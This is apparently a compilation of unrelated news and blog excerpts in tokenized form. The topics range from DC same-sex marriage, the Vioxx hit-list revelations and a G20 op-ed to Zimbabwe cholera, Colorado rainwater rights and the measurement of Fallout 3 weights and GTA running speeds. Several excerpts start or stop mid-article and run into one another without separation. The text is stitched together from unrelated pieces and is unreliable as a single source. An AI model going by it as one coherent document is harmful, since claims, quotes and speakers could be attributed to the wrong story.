According to a police spokesman , “ No - one could have expected what happened , as it had started to drizzle slightly , but there was no storm to be heard or seen in the sky . ”
Classy headline by the folks at the Austrian Times , who decided to go with “ Lightning Striker ” in their report of this story .
Was “ Flash Forward ” deemed to be in poor taste ?

A number of US states are considering laws to allow same - sex marriage Washington DC city council has voted to recognise same - sex marriages conducted in other US states .
As Washington DC is not a state , the decision will now have to be approved by Congress before it can become law .
Four US states - Vermont , Connecticut , Massachusetts and Iowa - now permit gay marriage , and legislation to allow it is in progress in other states .
A bill allowing same - sex marriage in Maine is likely to be sent soon to the governor to decide whether to sign it .
On Wednesday , the Maine House of Representatives approved the legislation by 89 votes to 56 .
The measure will now go back before the State Senate , which is also expected to pass it before going to Democratic Governor John Baldacci .
Mr Baldacci , who has in the past opposed , gay marriage , has not made his intentions public .
In Washington DC , the city council voted 12 votes to one to pass the resolution recognising same - sex marriages performed elsewhere .
Council member David A Catania - one of two openly gay members of the body - explained his reasons for supporting the measure during the debate .
" This issue is whether or not our colleagues on a personal level view me and [ Council member ] Jim Graham as your equals , " he said .
" If we are permitted the same rights and responsibilities and obligations as our colleagues .
So this is personal .
This is acknowledging our families as much as we acknowledge you . "
Fellow council member , and former Washington DC Mayor Marion Barry , was the only member to vote against the proposal .
" I understand this is personal to you and Mr Graham , " he said in response to Mr Catania 's remarks .
" I resent Mr Catania saying either you are a bigot or against bigotry as though this particular legislation represents all of that . "
The law will be sent to DC Mayor Adrian Fenty - a supporter of gay marriage - for approval , before being placed before Congress .

Some fast - food ad campaigns work because they 're funny -- like the Taco Bell Chihuahua ads from the early ' 90s , or the more current examples from Jack - in - the - Box , which invite us to send our respects to the fallen Jack ( he was hit by a bus on Super Bowl Sunday ) .
Other ads work because they 're creepy as hell ( seriously , I 'll buy a breakfast sandwich -- just do n't make me wake up to the King ) .
On the flip side are those campaigns that just do n't cut it .
Sometimes they 're ill - conceived , sometimes they just do n't connect with the audience .
And sometimes , like the ten examples that follow , they 're both of the above -- and so much more .
10 . " Whopper Virgins , " Burger King
Burger King 's recent campaign reaches back pretty far into advertising strategies ; the blind taste test really has n't been around in any major way since the Pepsi Challenge .
But in utilizing this classic persuasive strategy , Burger King inadvertently pissed a lot of people off -- mainly by using adorable foreigners so rural and backward that they do n't " even have a word for burger . "
Words like " exploitative " and " colonialist " have been used to describe it by some , but really , it could have been worse .
Consider the dietary issues that could result from feeding someone on subsistence caloric intake not one , but two greasy fast - food burgers in a sitting :
The whole project could have been co-sponsored by Pepto - Bismol and Charmin Ultra .
9 . " Avoid the Noid , " Domino's
Domino's Pizza went the mascot route back in the ' 80s , when claymation was inexplicably hot .
The Noid failed mainly because he made no sense -- he was a little spandex - wearing , floppy - eared man - freak who for some reason wanted to spoil your pizza .
This is where the mascot idea breaks down ; there has to be some internal logic to it .
Cereal mascots know this :
Sonny is cuckoo for Cocoa Puffs , and the Trix rabbit wo n't get any Trix because " Trix are for kids . "
But the Noid ?
Aside from a hard marketing push by Domino's ( including a really boring video game ) , there was no narrative to support his pizza terrorism .
Add to this the fact that tied in with this campaign was Domino 's 30 - minute delivery guarantee , and it was a campaign doomed from the get - go .
Any delivery promise that relies on franchise overexpansion and the breaking of innumerable traffic laws can't be good .
8. " MacTonight ! , " McDonald's
This late - '80s McDonald 's character attempted to make the kid-friendly joint into a more adult and upscale place -- a tall order for a restaurant that not only pioneered the Happy Meal but had a huge cast of cartoonish characters led by a giant clown .
And really , all Mac -- who was a crooning , Wayfarer - wearing , silver - suited piano - playing guy with a huge crescent moon for a face -- managed to do was make viewers ask themselves this :
Why the hell is a moon singing like Mel Torme on my television ?
And what does it have to do with cheap - ass burgers ?
7. " Red Pigtails , " Wendy's
Wendy's was blessed with some very good advertising luck over the years ; once Clara Peller 's " Where 's the beef ? " became tired , affable owner Dave Thomas was able to become a pretty successful spokesman .
But upon his death in 2002 , Wendy 's embarked on a series of experiments in creative advertising -- from the Mr. Wendy campaign , in which a man on the street tries to become the company spokesman ( fail ) , to this more recent campaign , in which average folks " wake up " from the fast - food rat race , wear red pigtails and inspire others .
Except that it 's tough to accept a guy in red pigtails inspiring someone to do anything other than walk calmly and quickly in the opposite direction , and perhaps contact local authorities .
6. " Kitchen Fresh Chicken , " KFC
Kentucky Fried Chicken changed its name to KFC in 1991 , to cease pointing out to an increasingly health - conscious American culture that most of its food came out of the deep fat fryer .
This was nothing new , as this 1980 ad proves .
But the Colonel 's progeny took this to a new extreme in 2005 , when for a time their ads floated the idea that KFC stood for " Kitchen Fresh Chicken . "
Nothing official , mind you , but they repeated the phrase several times in several ads , just to see if it caught on .
It did n't .
5. " Quiznos Rats , " Quiznos
Actually , no one knew if these things were rats or not , but they definitely gave off a rodent vibe .
And between their wandering eyes and matted fur and off - putting voices that bespoke of witnessed horrors the likes of which one does not like to contemplate while eating a meatball sub , they were all too reminiscent of the sort of guys who hang outside a Quiznos and ask for your change .
It was a bold experiment for Quiznos , this strange marriage of Photoshop guerrilla art and the selling of toasted sub sandwiches , but there 's no doubt that it did n't make anyone hungry .
4 . " Do n't Bother Me , I 'm Eating , " Carl 's Jr .
This campaign was primarily made up of people eating huge burgers in the most disgusting ways possible -- munching wetly , dripping sauces all over themselves , their eyes fluttering up into their heads as though they were experiencing a multiple all - beef - patty orgasm .
But the worst was the tag line , " Do n't bother me ... I 'm eating , " which provoked the same response from most viewers : " You 're on my TV , you gluttonous fuck . "
So Carl 's Jr. abandoned that line , but not before it got parodied all over the place , not only online , but even in a feature film like Idiocracy .
Perhaps this is why Carl 's Jr. has made it unavailable for YouTube ( the one above is way more tolerable ) .
When your ad campaign becomes the butt of so many jokes ?
Yeah , it starts to smell like ass .
3. " The Original Ronald McDonald , " McDonald's
How could an ad campaign that 's been around for more than a half - century be called a failure ?
Well , this is n't the Ronald McDonald Americans have come to know , with his McDonaldland friends like Grimace and Mayor McCheese and the rest .
This was the first one -- the original Ronald , who was apparently conceived as having just rolled out of a McDonald 's dumpster with cups , trays and assorted garbage still clinging to him .
( That 's Willard Scott under all that , by the way , and this , combined with his longtime service talking about centenarians and Smucker 's jam , makes one really stop and consider what a weird - ass career this guy has had . )
But the horror does n't stop there :
This is a clown that magically produces meat from his beltline and outwardly professes that he likes to do " all the things that boys and girls like to do . "
I do n't care what era you 're from , that 's just all sorts of wrong .
2. " The Frak Pak , " KFC
Not all of KFC 's faux pas have been related to its name ; more recently , it completely misread the intent of a term used on the TV show Battlestar Galactica , and used it in stunningly poor fashion in a cross-promotion .
Specifically , the term " frakkin ' , " which is obviously a direct , futuristic stand - in for the more profane " fuck . "
As in " What the frak ? " or " That 's unbelievably frakkin ' stupid . "
As reported by Topless Robot , the promotion in question offered up as a prize to ten lucky patrons a " Frak Pak " of Battlestar goodies .
Translated , of course , that 's a " Fuck Pack . "
Once this was pointed out to the geniuses at KFC , they changed their campaign to be called " The Can 't - Say - That - Word - on - TV Sweepstakes , " which was doubly stupid , since the whole point of the word itself is that it can be used on TV .
Just not in ad campaigns that offer " packs of fuck " to a lucky few .
Except in Amsterdam , of course , where this sort of thing is pretty common .
1. " Herb , " Burger King
This 1985 campaign is legendary for just how big it flopped .
Sort of a " Where 's Waldo ? " idea long before its time , the campaign started with a strategy similar to the current Jack - in - the - Box campaign : Instead of " Will Jack Live ? " it was " Who 's Herb ? "
Sadly , the national response to that question was " Who cares ? "
Eventually the King unveiled Herb himself -- a bald , middle - aged guy -- and tried to launch the " Where 's Herb ? " part of the $ 40 million mistake , in which customers who spotted Herb at their local Burger Kings won a cash prize .
But by then no one cared .
Ironically , Herb himself is now working the drive - thru at a Santa Monica Wendy's .
A fascinating court case in Australia has been playing out around some people who had heart attacks after taking the Merck drug ­Vioxx .
This medication turned out to increase the risk of heart attacks in people taking it , although that finding was arguably buried in their research , and Merck has paid out more than £ 2bn to 44,000 people in America – however , they deny any fault .
British users of the drug have had their application for legal aid rejected , incidentally : the health minister , Ivan Lewis , promised to help them , but documents obtained by the Guardian last week showed that within hours Merck launched an expensive lobbying effort that convinced the minister to back off .
This is a shame , because court cases can be tremendously revealing .
The first fun thing to emerge in the Australian case is email documentation showing staff at Merck made a " hit list " of doctors who were critical of the company , or of the drug .
This list contained words such as " neutralise " , " neutralised " and " discredit " next to the names of various doctors .
" We may need to seek them out and destroy them where they live , " said one email , from a Merck employee .
Staff are also alleged to have used other tactics , such as trying to interfere with academic appointments , and dropping hints about how funding to institutions might dry up .
Institutions might think about whether they wish to receive money from a company like that in future .
Worse still , is the revelation that Merck paid the publisher Elsevier to produce a publication .
The relationship between big pharma and publishers is perilous .
Any industry with global revenues of $ 600 bn can afford to buy quite a lot of adverts , and pharmaceutical companies also buy glossy expensive " reprints " of the trials it feels flattered by .
As we noted in this column two months ago , there is evidence that all this money distorts editorial decisions .
This time Elsevier Australia went the whole hog , giving Merck an entire publication which resembled an academic journal , although in fact it only contained reprinted articles , or summaries , of other articles .
In issue 2 , for example , nine of the 29 articles concerned Vioxx , and a dozen of the remainder were about another Merck drug , Fosamax .
All of these articles presented positive conclusions .
Some were bizarre : such as a review article containing just two references .
In a statement to The Scientist magazine , Elsevier at first said the company " does not today consider a compilation of reprinted articles a ' journal ' " .
I would like to expand on this ­statement :
It was a collection of academic journal articles , published by the academic journal publisher Elsevier , in an academic ­journal - shaped package .
Perhaps if it was n't an academic journal they could have made this clearer in the title which , I should have mentioned , was named : The Australasian Journal of Bone and Joint Medicine .
Things have deteriorated since .
It turns out that Elsevier put out six such journals , sponsored by industry .
The Elsevier chief executive , Michael Hansen , has now admitted that they were made to look like journals , and lacked proper disclosure .
" This was an unacceptable practice and we regret that it took place , " he said .
The pharmaceutical industry , and publishers , as we have repeatedly seen , have serious difficulties in living up to the high standards needed in this field , and bad information in the medical literature leads doctors to make irrational prescribing decisions , which ultimately can cost lives , and cause unnecessary suffering , not to mention the expense .
It has been estimated it would take 700 hours a month to read the thousands of academic articles relevant to a GP ; doctors skim , they take shortcuts , they rely on summaries , or worse .
We could perform better when giving them information , but for now , it will often be " actually , I think I 've seen at least two studies on that , and in different journals " .
The real tragedy is that the cost of distorted information , and irrational prescribing , is far greater than the cost of the research that could prevent it .
Health systems pay for these drugs – state - funded in almost every single developed country – and they largely pay for the journals , too .
In a sensible world , countries would band together and pay for comparative research themselves , and the free , open distribution of the results , to prevent all this nonsense .
We do not live in a sensible world .
Today 's Guardian poll of global gloom shows the British as the most pessimistic nation on earth .
They have the lowest expectation of economic recovery and the lowest opinion of their government .
On any level , they must be cheered up .
Misery feeds on itself .
Last week 's G20 summit proved to be Gordon Brown 's Falklands moment .
By means of kinetic diplomacy he turned disaster into brief triumph .
He did so , like Margaret Thatcher during the Falklands war , by locking up the reporters in a watertight compartment - be it a cruiser or a Docklands shed - denying them contact with key players and force - feeding them good news .
It worked .
Brown got the best press of his life .
Commentators are now pointing out that the G20 was a policy failure for Brown .
He and Barack Obama did not achieve a new global fiscal stimulus .
They did not reopen world trade or truly close tax havens .
The summit yielded no agreement on demand stimulus or on measures to cut unemployment .
It yielded old - style G8 promises of more loans to poor countries through the IMF , which may never be used .
Yet this does not matter .
What did matter was an agreement , even an agreement on nothing .
Authority had to seem coherent .
Cats had to pretend to be herded .
Brown had to pretend a success , and journalists entombed in the Royal group of docks had to declare a triumph .
At this stage in a recession any triumph is welcome .
It shows " the sneer of cold command " , the talisman of control .
It reassured the pessimists by implying that something was being done .
A yawning gap is opening between pessimism and optimism over the state of the world economy .
At G20 the pessimists were the British and Americans , and the optimists were most of the rest , led by the French and the Germans .
The former believed that government had to be seen as doing something to stimulate economic activity or confidence would continue to collapse .
The latter believed that the recession will end of its own accord and that enough has been done to expedite it .
For the optimists , the real debate is how to stop another such collapse occurring - caused as it was by Britons and Americans .
This gap is becoming ideological .
Pessimists hold that any modern economy needs corralling , channelling and chaining , or it will go berserk .
They view the free - market motorway pile - up of last autumn as a total systems failure .
In future , they say , all cars should go on rails , with signals and points dictating every turn .
The cars should be driven only by civil servants .
The clearest warning against this route is by Vince Cable in his excellent book The Storm , out this week .
It leads , he says , to " an emerging state capitalism " in which Chinese and Russian attitudes to industry and trade predominate .
According to Cable , over - ruthless market regulation could become " a generalised movement towards dirigisme and state control of economic activity " .
That is precisely the statism that Callaghan attacked 30 years ago , in telling the Labour party that " we cannot spend our way out of recession " .
It was to become New Labour 's motto under Tony Blair .
The pessimists have revived a dangerous expectation in the power of government to lead them out of recession .
Public opinion seems eager for any intervention , however daft , if it promises only to rescue the economy .
As a result , the Treasury has assigned about £ 200 bn to banks without any control or test of value for money .
It is inconceivable that such money would be given so freely anywhere other than to banks .
The intention was to stimulate lending and thus maintain demand .
The opposite has happened .
The policy has failed and unemployment is soaring .
Optimists would pursue an opposite policy .
They would certainly bring bankrupt banks under public control ( as would Cable ) , temporarily , to secure depositors ' money and loans .
They would then put the banks ' investment arms into administration , to ensure that no public money was used to underwrite bad debt .
They would print money but give it not to banks but to consumers , to maintain high - street demand - since without demand there is no one to whom the banks can lend even if they were so minded .
Optimists would boost money supply intravenously , notably by giving to those with a low propensity to save .
That might mean temporarily doubling pensions and social benefits , handing out time - limited spending vouchers , and making short - term cuts in VAT , excise and stamp duty .
In other words , optimists would put money in the hands of people to buy goods and services , and let the economy recover on the basis of that demand , not through dilatory bank lending or public works .
The British are good spenders and demand will work in time .
Within a couple of years
Dr Johnson would be proved right , in saying of the South Sea Bubble that it would one day seem " little more than a panick terrour from which , when they recover , many will wonder why they were so frightened " .
The gulf between pessimism and optimism reflects a continuing gap between socialism and individualism .
Everyone now accepts the need for government to regulate markets .
Equally , everyone accepts that markets must prosper for economies to recover .
No one wants a return to a wholly statist economy .
The search is on for a golden mean .
Yet in Britain , the pessimists have the best tunes .
Even the Tories seem unable to snap out of a me - too approach to the credit crunch , approving each new bank bailout as if dancing on a Labour marionette .
Their old monetarism , which would today advocate a liquidity surge , has been broken on the wheel of Thatcherite unpopularity .
The Tories are back to Heathism and the public sector consensus .
The pessimists , Labour and Tories alike , harbour a conviction that citizens are not to be trusted with their own money or used as prime agents of recovery .
They would rather governments or bankers spend the taxpayers ' money on the public 's behalf .
The one silver lining on today 's cloud is the glaring evidence that this paternalism does not work .
That is why Brown 's failure at the G20 last week was good news .
It put " global fiscal stimulus " back in the statist box and said to the citizens of the world : we have made a total mess of your economies and are leaving it to you to get out as best you can .
Now those citizens have a chance .

Zimbabwe 's sanitation and health infrastructure is dilapidated
The number of cholera cases in Zimbabwe is expected to reach 100,000 this week , according to the Red Cross .
While the infection rate has slowed , the underlying causes of Africa 's worst cholera epidemic in 15 years have not been fixed , warned the aid group .
So far , 98,309 cases have been reported , with some 4,283 deaths , said the Red Cross in a report .
The outbreak , which began last August , has been fuelled by Zimbabwe 's poor water , sanitation and health systems .
The International Federation of Red Cross and Red Crescent Societies ( IFRCS ) said infection rates of the easily - treatable water - borne disease had fallen by a quarter from a peak in February of 6 % of the population to 4.5 % .
The government estimates the necessary rehabilitation of water and sanitation infrastructure will take years

But the report warned that unless factors such as food insecurity , and the dilapidated sanitation and health infrastructure were addressed , further cholera outbreaks were inevitable .
Zimbabwe 's coalition government , formed in February between President Robert Mugabe and Prime Minister Morgan Tsvangirai , has pledged to make a priority of restoring eviscerated public services across the spectrum .
The IFRCS said it had been forced to scale back emergency aid measures after receiving only a small part of the donations it required .

" The government estimates the necessary rehabilitation of water and sanitation infrastructure will take years , " said Stephen Omollo , the IFRC 's representative in Zimbabwe .
The Red Cross said it had already provided nearly half a million people with access to clean water since its cholera relief mission to Zimbabwe was launched in December 2008 .

TAIPEI ( Reuters ) - A Taiwanese groom died on his wedding day after having too much wine and beer to drink , police and local media said Monday .
The man , 35 , an insurance company worker surnamed
Wu passed out at home after drinking too much Saturday at a high - end restaurant in Taipei among more than 100 wedding guests , the Liberty Times reported .
It was not known if he had health complications .
“ Everyone was having a great time , ” said restaurant party organizer Linda Chien .
“ We do n’t know what happened after that . ”
Wu was hospitalized after his face turned black , the paper said .
A hospital spokeswoman said he died despite treatment .
I ’ve lost hope that American society will ever say to any significant degree that there are too many laws .
I think it ’s some bizarre combination of addiction and apathy .
I have a pair of good walkie - talkies .
They ’re GMRS radios , but several times more powerful than the $ 29.95 Best Buy blister - pack ones .
They ’re occasionally handy , and I like having them around in case we ever lose telephone infrastructure for an extended period .
You ’re supposed to get an FCC license to transmit on GMRS frequencies .
It ’s something like $ 80 for five years , and there ’s no test or anything ; the license is yours for the asking and the money .
Thing is , almost nobody gets one .
Whenever I have my radios out , I almost always hear traffic that I know is illegal .
But enforcement is essentially impossible , so people say the hell with it .
So am I a patsy for holding a license ?
Maybe I am .
But at least I ’m not being punished for trying to follow the law , which is exactly what ’s happening to Colorado woman Kris Holstrom right now .
Holstrom applied for a water right to harvest the rainwater that falls on her house .
The state rejected her application , arguing that said rainwater would eventually feed a nearby river , and there was already a water right for the river water .
So according to the state of Colorado , the rain that falls on a person ’s house does not belong to that person .
It ’s easy to say she should have just done it in the first place .
How in the world would she get caught ?
But she certainly can’t do it now , as she could be fined $ 500 daily .
( This is for getting rain from her own roof .
Did I mention that already ? )
Do read the piece .
The absurdity is crushing .
Now clearly , the impossibility of effective enforcement should n’t itself determine whether a law is reasonable .
That slope is far too slippery .
However , when it ’s coupled with active torment of those seeking to comply with it , is that enough ?
And hey , is there a gun law parallel here ?

PRINCETON , N.J. , April 7 ( UPI ) --
A series of Gallup polls reveals people in countries with a higher percentage of religious people are more likely to say tolerance for minorities is low .
The Gallup Organization conducted polls in 139 countries between 2006 and 2008 .
Advertisement
Those countries were divided into five groups based on the percentage of those surveyed who said religion is important in their daily lives .
The polls found that religion is less likely to be important to residents of rich countries , who are also more likely to be tolerant .
But Gallup said the greater intolerance reported in religious countries cannot be explained just by differences in income .
Gallup analysts also said there are large differences among the world 's religions .
Hindus are the least likely to perceive their countries as bad places for members of ethnic or religious minorities , while Jews are the most likely .
Christians also appear to be generally tolerant of minorities , while Muslims , Buddhists and Jews are not .
Both Muslims and Jews in Israel appear far less tolerant than co-religionists living elsewhere .
Ample SDK , a GUI toolkit for building cross - browser , client - side applications through a " natural and efficient " development experience , is set to make its debut as a 1.0 release on November 1 , the founder of the project said on Thursday .
Written in JavaScript , Ample SDK is intended to also offer a better performance over other solutions , said project founder Sergey Ilinsky , owner of Helsinki , Finland - based Clientside OY .
It leverages standard APIs and technologies like XUL , XHTML , SVG1.
2 Tiny and , in the future , HTML 5 .
Developers can use skills in JavaScript , DOM , CSS , XHTML , and other technologies .
[ Earlier this week , JavaFX squared off against AJAX in a mock debate at the JavaOne conference . ]
" The [ Ample SDK ] framework emerged out of an academic exercise - an attempt to make Internet Explorer behave like a standard browser and another attempt to extend on browsers technologies stacks , " Ilinksy said .
The Ample SDK software runs transparently in the layer between a Web browser and an application .
It provides the logic of an application with standard cross - browser access to the user interface .
" Ample SDK runs in every modern Web browser , " the Ample SDK Web site states .
" When running , it fills in functionality missing from the browser , giving Web developers a standards - based API that allows them to stop worrying about browser quirks and start efficiently writing cross - browser application code . "
No components are required on the browser .
" It does n't modify the browser infrastructure , but rather fills in the missing functionality , " according to the Ample SDK Web site .
Ample SDK is now in a technical preview phase of development .
He then told the audience that , in the last 100 years , house prices have recovered from every downturn and gone on to reach record highs .
Oh , and Wells Fargo and Countrywide were standing by , ready to offer financing to qualified auction buyers .
If nothing else , this sales pitch certainly had chutzpah .
It combined the old bubble - era notion that house prices always rise over time ( ignoring the fact that incomes , stock values and the price of bread do , too ) with the new postcrash idea that houses must be a bargain because they ’re a lot cheaper than they used to be .
Even Countrywide , which was taken over by Bank of America after so many of its subprime mortgages went bad , is still part of the housing pitch .
Yet as soon as the auction began , it was clear that the pitch was n’t working .
The winning bid on the first home auctioned off , a two - bedroom townhouse in Virginia Beach , was $ 115,000 .
Just last July , it sold for $ 182,000 , according to property records .
A four - bedroom brick house with a two - car garage in Upper Marlboro , Md. , went for $ 375,000 .
Last year , it sold for $ 563,000 .
Throughout the evening , such low - ball prices continued to win the bidding .
At one point , the auctioneer , Wayne Wheat , interrupted his sing - song auction call to cheerfully ask , “ Where are my investors ? ”
The tables that had been set up around the edges of the ballroom , reserved for people planning to buy multiple houses , were mostly empty .
Many audience members , like the man in a camouflage baseball cap just in front of me , were attending their first auction .
On Sunday , my colleague Carmen Gentile went to a larger auction , in Miami , to see if my experience had been unusual .
It was n’t .
The homes there also sold for just a fraction of what they would have even a year ago .
The rate of decline in Miami has n’t even slowed noticeably in recent months , according to data kept by Real Estate Disposition Corporation , known as R.E.D.C. , which runs the auctions .
“ It ’s quite likely the left is not going to get what it wants , ” said Thomas C. Goldstein , co-head of the Supreme Court practice at Akin Gump Strauss Hauer & Feld and founder of Scotusblog , a well - read Web site .
“ If you talk about somebody who ’s a true liberal , a very strong progressive and a visionary architect of the law and jurisprudence , then you ’re talking about somebody like Pam Karlan at Stanford .
And nobody is seriously talking about Pam Karlan . ”

Other favorites of the left who do not appear to be on Mr. Obama ’s short list are Kathleen M. Sullivan , who also teaches at Stanford , and Harold Hongju Koh , the dean of Yale Law School , whom the president has nominated to be the legal adviser at the State Department .
“ Unless Obama restrains his compulsion toward centrist consensus and appoints real progressives to replace not only Souter but Ginsburg and Stevens , our right - wing court may get even more conservative , ” Jeff Cohen , founding director of the Park Center for Independent Media at Ithaca College , wrote on a Web site for progressive commentary , OpEdNews.com .
The four said to be on Mr. Obama ’s list are known as liberals if not crusaders , and advocates said they would still generate enthusiasm .
Judge Wood , in particular , has attracted favorable attention from the left .
Still , Geoffrey Stone , a University of Chicago law professor , who expressed great support for his former colleague , noted that she was an “ incrementalist ” not inclined to take on broad structural changes in the law .
Ms. Kagan has drawn more mixed reviews on the left because of her support for executive power and what some colleagues said was a tendency to find a middle road .
The White House does not appear to be especially worried about criticism from the left .
With an eye to the confirmation battle ahead , it seems happy to embrace the conclusion that Mr. Obama was choosing from a list with more moderate tendencies than many liberals would like to see in the next justice .
Mr. Obama is already taking heat from conservatives for saying he favors appointing someone who shows “ empathy , ” a word the right views as code for judicial activism .

It ’s been nearly a full year since we had our 6.1KW solar power system installed .
During that year , we experienced the peak of summer and the low point of winter .
Sunnyvale , California is at 37 degrees , 22 minutes north latitude , 122 degrees , 2 minutes west longitude .
That means we ’re south of the 45th parallel , which means more sun year round , but less sun during the peak summer daylight hours .
I ’ve written extensively about our solar power installation I had installed back in May 2008 along with a one month update and a Q&A on my installation .
At the six month update , I wrote about the doldrums of winter , and gave an update on power generation , power usage , and cost .
At the one year mark , I received the true - up bill from PG&E , so I know exactly how much I paid over the year , as well as the monthly breakdowns .

To needlessly expose the wide gulf between video game physics and the laws of the real world ; to pursue , to a pointless degree if necessary possible , the logical extremes of any mathematical given ; to ask the questions that do not really deserve to be answered ; and as an ultimate , Quixotic pursuit , to finally define the real world value of one hit point .

In an RPG , you 'd expect to have some distorted encumbrance measurements .
Players have been hauling around a full cabinet of arms , plus full plate armor , plus a spare set of armor , plus dual - wield crossbows , plus 500 bolts , plus turkey dinner , since this kind of game was played on paper .
It 's why D&D invented the Portable Hole .
Fallout 3 measures weight in vague units of " WG . "
Of any RPG that caps carrying weight , it seems to let you carry a lot .
Like a U - Haul 's worth .
In my latest game I deliberately created a guy with 4 strength because I wanted him to travel light and carry only that which was useful .
But as you can see in this recent loadout below , I 'm still stowing a spare set of recon armor in case a Glowing One makes me dump in my Brotherhood suit .
Weapons : A3 -21 's Plasma Rifle , Combat Shotgun , 28 Frag Grenades , 15 Frag Mines , Mesmetron , 3 Plasma Grenades , 4 Plasma Mines , Plasma Pistol , 9 Pulse Grenades , Scoped .44 Magnum ( 56 WG )

What bothered me about Fallout was not so much that the heavy weapons , like a Flamer , weighed only " 15 . "
Maybe they 're made from futuristic lightweight metal .
No , it 's more that a pair of freaking TWEEZERS was equivalent in weight to a motorcycle helmet .
It 's not even that the WG figure represents a total encumbrance factor – that either the item 's size or fragility makes it difficult to carry - because a pool cue has the same WG figure : 1 .
So I chatted up Todd Howard of Bethesda Softworks , Fallout 3's game director , about this .
First off , is " WG " equivalent to anything ?
Advertisement
" Not really , " Todd said .
" It 's sort of close to pounds , but we intentionally do n't really say what it is .
It actually started based on the weights we used for The Elder Scrolls , which most people do n't know are the also - amorphous ‘ stones . ' "
Advertisement
OK , fine .
If they did n't peg WG to something , I will .
And I 'm going to base it on the weight of beer .
A bottle in Fallout is 1 WG .
In real life , a bottle of beer , depending on how stout it is , will weigh roughly three - quarters of a pound when you figure in the glass .
By figuring my total burden as it relates to at least one item in my possession , I could start imagining how large a load I was carrying around .
But what I could n't measure is ammo , meds and chems , which have no weight value - and I was n't going down to the local needle exchange to weigh whatever approximates a Jet syringe .
Why did n't Bethesda give them a weight ?
Because in the game , these are very valuable items .
Why would n't an RPG , which is more based in realism and more dependent on choice - making than other genres , also require players to be more conscientious about what they 're carrying ?
Advertisement
" In regards to ammo and money , it 's just too granular a decision for the player , if they had weight , " Todd said .
" You do n't want to make that a choice for the player ; he already has to manage so much in his inventory and you need things he can find that are an instant win - ammo , money , drugs , etc , things that help keep him alive and playing .
It would just bog the game down too much to find ammo and be thinking , ‘ Do I want to pick up two of these bullets or the whole stack ? '
We felt that decision should be on [ which ] weapons to carry , not what ammo . "
Advertisement
Yes , but when a Gatling Laser weighs the same as a frosty 18 - can fridge pack of Miller , your decision to carry two is not because of their combat utility but the resale value in Rivet City .
Todd said that 's entirely valid reasoning , and strength is meant to enable it .
" Much of your character 's power comes from his stuff .
The more he has , the better he is .
Even if he 's not using it , it becomes money , " Todd said .
" Players get pretty good at the value versus weight game quickly . "
Advertisement
You might figure that , in the long run , it all balances out .
Tweezers are overweighted , bazookas are underweighted , and everyone gets along .
But my previous loadout would weigh 138 pounds ( 1 WG = 0.75 pounds ) and still fill up a Public Storage room .
Todd insisted that developers discussed the question of how much a player should be able to carry , " right until the end . …
We kept narrowing and narrowing what a low - strength versus high - strength gave you , because it was too powerful . "
Advertisement
Was too powerful ?
In the finished game , a Fallout 3 character with the bare minimum strength of 1 can carry 160 WG .
I searched for a real world comparison , and this is the best I could do : The Improved Load Bearing Equipment in use by the U.S. Marine Corps since 2005 can carry - ready for this ?
- 120 pounds .
If beer is our unit of measure ( and why should n't it be ? ) that converts to 160 bottles of beer ( or WG ) .
In other words , any vault reject a notch above total weakling - a 2 strength or better - will out - lug any Marine , even the one assigned to carry the mortar and shells .
Partly to spite Bethesda , I created a character with 1 Strength and assigned the rest of the points to more useful attributes .
I never use melee weapons , anyway .
I also manually assigned weight to my ammunition and chems ( 1 for units of 10 ) .
I quickly saw how right Todd was .
Advertisement
In Fallout , your ability to meet more difficult challenges depends a lot on the equipment you have , and it 's usually items you build or buy that prove the difference .
Financing that comes from the resale of surplus items , not the discovery of treasure .
Realistic strength would leave you endlessly grinding before starting the next job .
As for ammo , I gave up on that shortly after a raid at the Super - Duper Mart .
I was robbing Raider corpses for spare rounds to fight off the survivors and writing down the totals .
It was indeed too granular a decision , and got in the way of more pressing challenges .

So , even though with a 5 strength , you can run from Megaton to the Arlington Public Library loaded down like a Peruvian donkey , let 's just say the future is made of super - light plastics .
And the radiation turned everyone into Lou Ferrigno .

SPEED
Game : Grand Theft Auto : San Andreas
Test Subject : Carl " C.J. " Johnson
Originally , I wanted to test the scale speeds of the Team Fortress 2 characters , especially Scout , who could probably outrun Carl Lewis like a Porsche outruns Stephen Hawking .
The problem with this , as with other games , is measuring the distance those guys cover in real world units .
I 'd have to know , say , Heavy 's IRL height ( 6'5 ? " ) and be able to lay him end to end over a straightaway to get its real distance .
I 'm not a modder , and I would n't have that kind of time anyway .
Advertisement
So I then looked to the Grand Theft Auto series .
From Claude to Niko , you 've always had the ability to overtake a moving car on foot and jack it .
I really wanted to know these guys ' running speeds , and they live in cities with structures based on real world ones .
Unfortunately , everything in Liberty City is a compressed distance , so running Niko across the Broker Bridge still would n't tell us much .
Advertisement
But in Grand Theft Auto : San Andreas , there 's this Easter egg , which identifies the specific dimensions of the Gant Bridge , including a length of 159.7 meters .
During the first few tests , something seemed way off .
First , 159.7 meters is n't even a 10th of a mile , and C.J. 's runs - at a sprint - were keeping up with traffic and returning mile times of 17:41 .
So I had to measure this bridge for myself .
If I knew the actual scale speed of a vehicle in the game , I could derive its length .
This database lists all such attributes .
Thus aboard an NRG - 500 motorcycle running at its top speed of 118 mph , I made five maximum - speed trips across the bridge , at a flying start , with a median time of 18.15 seconds .
If the Gant Bridge really was 159.7 meters , the bike would have been doing 20 mph , not 120 mph .
It 's possible they 're talking about a distance shorter than the one I was using - toll booth in San Fierro to concrete strip at Tierra Robada - but at top speed , the bike should be able to cross 159.7 meters in just under 3 seconds .
Either way , 160 meters is a fraction of the bridge 's length as it relates to C.J .
Advertisement
So , at top speed , the bike is traveling at 173.16 feet per second .
Multiplied by 18.15 , we discover the length of the Gant Bridge is 3,142.85 feet , which is nearly 1 kilometer .
As another control , I went back and rode with traffic , matching its speed .
We crossed the bridge in 1:09.16 , which is 30.98 miles per hour .
I damn for sure could see a developer setting standard traffic speed to something round , and 31 mph is almost 50 kph .
So , I 'm pretty confident the sign is incorrect , and I got this measured as close as possible .
Now , back to running it .
C.J. has five paces on foot : a walk , a " brisk walk , " a " jog , " and then two sprints , one with the A button held down , and another that provides a burst of speed by rapidly tapping it .
The C.J. I was playing had maxed all of his physical stats , so he could achieve top running speed and not tire out , at any distance .
Back at the bridge on foot , I took him through the five paces .
Advertisement
Walking
At his slowest C.J. covered the distance in 8:22 , which equates to 4.2 miles per hour .
Frame of reference : 4.0 is the fastest most walk on a gym treadmill .
At the " brisk walk " pace , C.J. covers the distance in 4:44.03 .
Remember our treadmill ?
This " walk " is more than a jog , it 's 7.54 miles per hour .
It 's equivalent to a 7:57 mile time .
My best time in the mile - running - is 8:21 , five years ago .
Advertisement
Running
Now it gets good .
